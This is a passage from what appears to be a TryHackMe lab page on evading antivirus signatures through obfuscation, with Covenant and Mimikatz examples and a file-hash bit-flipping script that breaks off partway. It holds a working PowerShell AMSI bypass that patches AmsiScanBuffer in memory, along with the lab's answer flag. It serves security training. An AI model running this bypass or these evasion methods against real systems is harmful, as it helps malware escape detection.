            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible"><span data-pf_style_display="inline" data-pf_style_visibility="visible">ï»¿</span>Once we have identified a troublesome signature we need to decide how we want to deal with it. Depending on the strength and type of signature, it may be broken using simple obfuscation as covered in <a href="https://tryhackme.com/room/obfuscationprinciples" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</a>, or it may require specific investigation and remedy. In this task, we aim to provide several solutions to remedy static signatures present in functions.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">
</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The <a href="https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf" data-pf_style_display="inline" data-pf_style_visibility="visible">Layered Obfuscation Taxonomy</a> covers the most reliable solutions as part of the <strong data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscating Methods</strong> and <strong data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscating Classes</strong> layer.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscating methods</span></p><table class="table table-bordered" data-pf_style_display="table" data-pf_style_visibility="visible"><tbody data-pf_style_display="table-row-group" data-pf_style_visibility="visible"><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Method<br data-pf_style_display="inline" data-pf_style_visibility="visible"></b></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Purpose</b><br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Method Proxy<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Creates a proxy method or a replacement object<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Method Scattering/Aggregation<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Combine multiple methods into one or scatter a method into several<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Method Clone<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Create replicas of a method and randomly call each<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr></tbody></table><p style="text-align:left" data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscating Classes</span></p><table class="table table-bordered" data-pf_style_display="table" data-pf_style_visibility="visible"><tbody data-pf_style_display="table-row-group" data-pf_style_visibility="visible"><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Method<br data-pf_style_display="inline" data-pf_style_visibility="visible"></b></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible"><b data-pf_style_display="inline" data-pf_style_visibility="visible">Purpose</b><br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Class Hierarchy Flattening<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Create proxies for classes using interfaces<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Class Splitting/Coalescing<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Transfer local variables or instruction groups to another class<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr><tr data-pf_style_display="table-row" data-pf_style_visibility="visible"><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Dropping Modifiers<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td><td data-pf_style_display="table-cell" data-pf_style_visibility="visible">Remove class modifiers (public, private) and make all members public<br data-pf_style_display="inline" data-pf_style_visibility="visible"></td></tr></tbody></table><p data-pf_style_display="block" data-pf_style_visibility="visible">Looking at the above tables, even though they may use specific technical terms or ideas, we can group them into a core set of agnostic methods applicable to any object or data structure.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">The techniques <strong data-pf_style_display="inline" data-pf_style_visibility="visible">class splitting/coalescing</strong> and <strong data-pf_style_display="inline" data-pf_style_visibility="visible">method scattering/aggregation</strong> can be grouped into an overarching concept of splitting or merging any given <strong data-pf_style_display="inline" data-pf_style_visibility="visible">OOP</strong> (<strong data-pf_style_display="inline" data-pf_style_visibility="visible">O</strong>bject-<strong data-pf_style_display="inline" data-pf_style_visibility="visible">O</strong>riented <strong data-pf_style_display="inline" data-pf_style_visibility="visible">P</strong>rogramming) function.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Other techniques such as <strong data-pf_style_display="inline" data-pf_style_visibility="visible">dropping modifiers</strong> or <strong data-pf_style_display="inline" data-pf_style_visibility="visible">method clone</strong> can be grouped into an overarching concept of removing or obscuring identifiable information.</p><hr data-pf_style_display="block" data-pf_style_visibility="visible"><h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Splitting and Merging Objects</span></h3><p data-pf_style_display="block" data-pf_style_visibility="visible">The methodology required to split or merge objects is very similar to the objective of concatenation as covered in <a href="https://tryhackme.com/room/signatureevasion" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles.</a></p><p data-pf_style_display="block" data-pf_style_visibility="visible">The premise behind this concept is relatively easy, we are looking to create a new object function that can break the signature while maintaining the previous functionality.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">To provide a more concrete example of this, we can use the <a href="https://offensivedefence.co.uk/posts/covenant-profiles-templates/" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">well-known case study</a> in Covenant present in the <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">GetMessageFormat</code> string. We will first look at how the solution was implemented then break it down and apply it to the obfuscation taxonomy.</p><p data-pf_style_display="block" data-pf_style_visibility="visible"><strong data-pf_style_display="inline" data-pf_style_visibility="visible">Original String</strong></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the original string that is detected</p><pre class=" language-csharp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-csharp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">string</span></span> MessageFormat <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2},""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
</code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible"><strong data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscated Method</strong></p><p data-pf_style_display="block" data-pf_style_visibility="visible">Below is the new class used to replace and concatenate the string.</p><pre class=" language-csharp" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-csharp" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">public</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">static</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">string</span> GetMessageFormat <span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// Format the public method</span>
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
    <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">get</span> <span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// Return the property value</span>
    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">{</span>
        <span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">var</span></span> sb <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">new</span> <span class="token constructor-invocation class-name" data-pf_style_display="inline" data-pf_style_visibility="visible">StringBuilder</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"{{""GUID"":""{0}"","</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span> <span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// Start the built-in concatenation method</span>
        sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Append</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"""Type"":{1},"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span> <span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// Append substrings onto the string</span>
        sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Append</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"""Meta"":""{2}"","</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Append</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"""IV"":""{3}"","</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Append</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"""EncryptedMessage"":""{4}"","</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Append</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">@"""HMAC"":""{5}""}}"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
        <span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">return</span> sb<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span><span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">ToString</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span> <span class="token comment" data-pf_style_display="inline" data-pf_style_visibility="visible">// Return the concatenated string to the class</span>
    <span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>
<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">}</span>

<span class="token class-name" data-pf_style_display="inline" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">string</span></span> MessageFormat <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> GetMessageFormat
</code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">









</p><p data-pf_style_display="block" data-pf_style_visibility="visible">Recapping this case study, class splitting is used to create a new class for the local variable to concatenate. We will cover how to recognize when to use a specific method later in this task and throughout the practical challenge.</p><hr data-pf_style_display="block" data-pf_style_visibility="visible"><h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">Removing and Obscuring Identifiable Information</span></h3><p data-pf_style_display="block" data-pf_style_visibility="visible">The core concept behind removing identifiable information is similar to obscuring variable names as covered in <a href="https://tryhackme.com/room/signatureevasion" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</a>. In this task, we are taking it one step further by specifically applying it to identified signatures in any objects including methods and classes.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">An example of this can be found in Mimikatz where an alert is generated for the string <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">wdigest.dll</code>. This can be solved by replacing the string with any random identifier changed throughout all instances of the string. This can be categorized in the obfuscation taxonomy under the method proxy technique.</p><p data-pf_style_display="block" data-pf_style_visibility="visible">

</p><p data-pf_style_display="block" data-pf_style_visibility="visible">This is almost no different than as discussed in <a href="https://tryhackme.com/room/signatureevasion" target="_blank" data-pf_style_display="inline" data-pf_style_visibility="visible">Obfuscation Principles</a>; however, it is applied to a specific situation.</p><hr data-pf_style_display="block" data-pf_style_visibility="visible"><p data-pf_style_display="block" data-pf_style_visibility="visible">Using the knowledge you have accrued throughout this task, obfuscate the following PowerShell snippet, using AmsiTrigger to visual signatures.</p><pre class=" language-powershell" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-powershell" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$MethodDefinition</span> = <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport(`"kernel32`")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport(`"kernel32`")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>

<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$Kernel32</span> = <span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">Add-Type</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>MemberDefinition <span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$MethodDefinition</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>Name <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">'Kernel32'</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>NameSpace <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">'Win32'</span> <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">-</span>PassThru<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$A</span> = <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"AmsiScanBuffer"</span>
<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$handle</span> = <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Win32.Kernel32]</span>::GetModuleHandle<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">'amsi.dll'</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[IntPtr]</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$BufferAddress</span> = <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Win32.Kernel32]</span>::GetProcAddress<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$handle</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$A</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$Size</span> = 0x5<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$ProtectFlag</span> = 0x40<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$OldProtectFlag</span> = 0<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Win32.Kernel32]</span>::VirtualProtect<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$BufferAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$Size</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$ProtectFlag</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Ref]</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$OldProtectFlag</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span>
<span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$buf</span> = <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Byte[]]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span>0xB8<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span><span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span>0x57<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[UInt32]</span>0x00<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Uint32]</span>0x07<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Uint32]</span>0x80<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[Uint32]</span>0xC3<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span> 

<span class="token namespace" data-pf_style_display="inline" data-pf_style_visibility="visible">[system.runtime.interopservices.marshal]</span>::<span class="token function" data-pf_style_display="inline" data-pf_style_visibility="visible">copy</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$buf</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> 0<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token variable" data-pf_style_display="inline" data-pf_style_visibility="visible">$BufferAddress</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> 6<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">;</span></code></pre><p data-pf_style_display="block" data-pf_style_visibility="visible">Once sufficiently obfuscated, submit the snippet to the webserver at <code data-pf_style_display="inline-block" data-pf_style_visibility="visible">http://MACHINE_IP/challenge-1.html</code>.&nbsp;<span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">The file name must be saved as</span><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">&nbsp;</span><code style="font-size:14px" data-pf_style_display="inline-block" data-pf_style_visibility="visible">challenge-1.ps1</code><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">. If correctly obfuscated a flag will appear in an alert pop-up</span></p></div>
        </div>
        
        <div class="room-questions-split vertical-align-custom hacker-green" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div data-pf_style_display="block" data-pf_style_visibility="visible">Answer the questions below</div>
        </div>
        
                            <div class="room-task-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <div class="room-task-question-no vertical-align-custom" data-pf_style_display="flex" data-pf_style_visibility="visible">
                                
                            </div>
                            <div class="room-task-question-details" data-pf_style_display="block" data-pf_style_visibility="visible">
                                <div data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:1rem" data-pf_style_display="inline" data-pf_style_visibility="visible">What flag is found after uploading a properly obfuscated snippet?</span><br data-pf_style_display="inline" data-pf_style_visibility="visible"></div>
                            </div>
                        </div>

                    <div class="room-task-input" data-pf_style_display="grid" data-pf_style_visibility="visible">
                        <div class="room-task-input-questions" data-pf_style_display="flex" data-pf_style_visibility="visible">
                            <input type="text" class="form-control room-answer-field" placeholder="Answer format: ***{**************************}" value="THM{70_D373C7_0r_70_N07_D373C7}" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <input type="hidden" value="1" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                            <input type="hidden" value="4" data-pf_style_display="none" data-pf_style_visibility="visible" class="hidden-originally">
                        </div>
                        <div class="room-task-input-answer" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <button type="button" class="btn btn-success task-answer" disabled="" data-pf_style_display="block" data-pf_style_visibility="visible">
                            Correct Answer
                        </button>
                        </div>
                        
                    </div>
                        </div>
                    </div>
                </div><div class="card" id="task-5" data-pf_style_display="flex" data-pf_style_visibility="visible">
                    <div class="card-header task-header" data-toggle="collapse" href="#collapse5" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <a class="card-link" data-pf_style_display="inline" data-pf_style_visibility="visible">
                            <span class="task-dropdown-title hacker-green" data-pf_style_display="inline" data-pf_style_visibility="visible">Task 5                             <span class="task-dropdown-icon" data-pf_style_display="inline" data-pf_style_visibility="visible"><i class="fas fa-check-circle" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span></span> Static Property-Based Signatures
                            <span class="float-right" data-pf_style_display="block" data-pf_style_visibility="visible"><i class="fas fa-chevron-down" data-pf_style_display="inline-block" data-pf_style_visibility="visible"></i></span>
                            <span class="task-resources" data-pf_style_display="block" data-pf_style_visibility="visible"></span>
                        </a>
                    </div>
                    <div id="collapse5" class="collapse show" data-parent="#taskContent" data-pf_style_display="block" data-pf_style_visibility="visible">
                        <div class="card-body task-complete" data-pf_style_display="block" data-pf_style_visibility="visible">
                            <div class="room-task-desc" data-pf_style_display="flex" data-pf_style_visibility="visible">
            <div class="room-task-desc-data" data-pf_style_display="block" data-pf_style_visibility="visible"> <p data-pf_style_display="block" data-pf_style_visibility="visible">Various detection engines or analysts may consider different indicators rather than strings or static signatures to contribute to their hypothesis. Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as <strong data-pf_style_display="inline" data-pf_style_visibility="visible">YARA</strong> or <strong data-pf_style_display="inline" data-pf_style_visibility="visible">Sigma</strong>.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">This task will discuss manipulating the <strong data-pf_style_display="inline" data-pf_style_visibility="visible">file hash</strong> and <strong data-pf_style_display="inline" data-pf_style_visibility="visible">entropy</strong> of both open-source and closed-source applications.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Note: several other properties such as PE headers or module properties can be used as indicators. Because these properties often require an agent or other measures to detect, we will not cover them in this room to keep the focus on signatures.</p>
<hr data-pf_style_display="block" data-pf_style_visibility="visible">
<h3 data-pf_style_display="block" data-pf_style_visibility="visible"><span style="font-size:24px" data-pf_style_display="inline" data-pf_style_visibility="visible">File Hashes</span></h3>
<p data-pf_style_display="block" data-pf_style_visibility="visible">A&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">file hash</strong>, also known as a&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">checksum</strong>, is used to tag/identify a unique file. They are commonly used to verify a fileâ€™s authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">If we have access to the source for an application, we can modify any arbitrary section of the code and re-compile it to create a new hash. That solution is straightforward, but what if we need a pre-compiled or signed application?</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">When dealing with a signed or closed-source application, we must employ&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">bit-flipping</strong>.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">Bit-flipping is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality.</p>
<p data-pf_style_display="block" data-pf_style_visibility="visible">We can use a script to create a&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">bit-flipped list</strong> by flipping each bit and creating a new&nbsp;<strong data-pf_style_display="inline" data-pf_style_visibility="visible">mutated variant</strong> (~3000 - 200000 variants). Below is an example of a python bit-flipping implementation.</p>
<pre class=" language-python" tabindex="0" data-pf_style_display="block" data-pf_style_visibility="visible"><code class=" language-python" data-pf_style_display="inline-block" data-pf_style_visibility="visible"><span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">import</span> sys

orig <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">list</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">open</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>sys<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>argv<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">[</span><span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">1</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">]</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">,</span> <span class="token string" data-pf_style_display="inline" data-pf_style_visibility="visible">"rb"</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">.</span>read<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span>

i <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">=</span> <span class="token number" data-pf_style_display="inline" data-pf_style_visibility="visible">0</span>
<span class="token keyword" data-pf_style_display="inline" data-pf_style_visibility="visible">while</span> i <span class="token operator" data-pf_style_display="inline" data-pf_style_visibility="visible">&lt;</span> <span class="token builtin" data-pf_style_display="inline" data-pf_style_visibility="visible">len</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">(</span>orig<span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">)</span><span class="token punctuation" data-pf_style_display="inline" data-pf_style_visibility="visible">:</span>
